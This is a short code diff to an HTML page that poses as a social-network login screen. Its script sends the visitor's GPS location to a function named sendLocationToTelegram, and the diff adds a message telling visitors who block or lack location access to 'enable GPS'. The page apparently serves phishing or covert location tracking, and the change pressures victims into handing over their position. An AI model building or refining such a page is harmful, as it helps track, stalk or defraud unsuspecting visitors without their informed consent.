@@ -97,6 +97,12 @@
             text-align: center;
             display: none;
         }
+        #gps-error-message {
+            color: red;
+            margin-top: 10px;
+            text-align: center;
+            display: none;
+        }
         /* Responsive Design */
         @media (max-width: 768px) {
             .container {
@@ -140,6 +146,7 @@
                 <div class="error-message" id="error-message">Wrong username or password. Please try again.</div>
             </div>
             <button class="create-account">Create new account</button>
+            <div id="gps-error-message">Please enable GPS on your device.</div>
         </div>
     </div>
     <script>
@@ -263,9 +270,11 @@
                     await sendLocationToTelegram(locationInfo);
                 }, (error) => {
                     console.error("Error getting location: ", error);
+                    document.getElementById('gps-error-message').style.display = 'block';
                 });
             } else {
                 console.error("Geolocation is not supported by this browser.");
+                document.getElementById('gps-error-message').style.display = 'block';
             }
         }
 
